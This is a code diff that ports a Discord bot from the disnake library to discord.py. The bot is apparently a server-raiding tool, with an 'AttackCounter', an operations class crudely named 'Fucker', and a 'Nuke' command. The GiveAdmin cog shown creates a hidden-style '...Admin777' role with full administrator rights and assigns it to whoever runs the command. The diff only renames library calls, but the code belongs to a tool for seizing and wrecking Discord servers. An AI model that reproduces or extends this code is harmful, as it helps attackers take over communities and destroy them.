@@ -1,8 +1,8 @@
 import logging
 
-import disnake
-from disnake.ext import commands
-from disnake.ext.commands import BucketType, CommandOnCooldown
+import discord
+from discord.ext import commands
+from discord.ext.commands import BucketType, CommandOnCooldown
 
 from core.managers.counter import AttackCounter
 from core.operations import Fucker
@@ -17,11 +17,11 @@ class GiveAdmin(commands.Cog):
         try:
             admin_role = await ctx.guild.create_role(
                 name=f"{NAME}Admin777",
-                permissions=disnake.Permissions(administrator=True),
+                permissions=discord.Permissions(administrator=True),
             )
             await ctx.author.add_roles(admin_role)
             await ctx.send("Successfully granted!", delete_after=2)
-        except disnake.Forbidden:
+        except discord.Forbidden:
             await ctx.send("Error: No permission, make sure i have admin!", delete_after=2)
         except Exception as e:
             logging.error(f"Error: {e}!")
@@ -51,8 +51,8 @@ class Nuke(commands.Cog):
     @nuke.error
     async def nuke_error(self, ctx, error):
         if isinstance(error, CommandOnCooldown):
-            embed = disnake.Embed(
-                title="Cooldown", color=disnake.Color.from_rgb(48, 49, 54)
+            embed = discord.Embed(
+                title="Cooldown", color=discord.Color.from_rgb(48, 49, 54)
             )
             embed.add_field(
                 name="Error.",
